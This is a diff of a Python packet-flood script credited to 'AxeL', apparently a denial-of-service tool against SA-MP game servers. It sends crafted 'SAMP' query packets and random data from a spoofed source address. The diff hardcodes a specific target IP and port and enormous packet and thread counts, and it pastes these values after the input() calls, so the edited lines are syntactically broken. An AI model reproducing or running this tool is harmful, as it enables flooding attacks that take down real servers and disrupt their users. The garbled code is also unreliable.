@@ -22,22 +22,22 @@ print("""
                Tools By AxeL
 """)
 
-ip = str(input("\033[95m=====> + IP Target    : "))
-port = int(input("=====> + PORT Target  : "))
-times = int(input("=====> $ Send PACKETS : "))
-threads = int(input("=====> $ Send THREADS : "))
-choice = str(input("=====> × Ready? (y/n) : "))
-fake_ip = '182.21.20.32'
+ip = str(input("\033[95m=====> + IP Target    : "))139.177.189.98
+port = int(input("=====> + PORT Target  : "))5572
+times = int(input("=====> $ Send PACKETS : "))139.177.189.98:5572
+threads = int(input("=====> $ Send THREADS : "))99999999999
+choice = str(input("=====> × Ready? (y/n) : "))9999999999
+fake_ip = '139.177.189.98'
 #Starting Attacking
 Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                        codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
                        codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
                        codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
-                       codecs.decode("081e62da","hex_codec"), #cookie port 7796
-                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
-                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771
-                       codecs.decode("021efd40","hex_codec"),#cookie port 7784
-                       codecs.decode("081e7eda","hex_codec")#cookie port 7784 tambem
+                       codecs.decode("081e62da","hex_codec"), #cookie port 5573
+                       codecs.decode("081e77da","hex_codec"),#cookie port  5572
+                       codecs.decode("081e4dda","hex_codec"),#cookie port  5572
+                       codecs.decode("021efd40","hex_codec"),#cookie port 5572
+                       codecs.decode("081e7eda","hex_codec")#cookie port 5572 tambem
                        ]
 def run():
 	data = random._urandom(17)
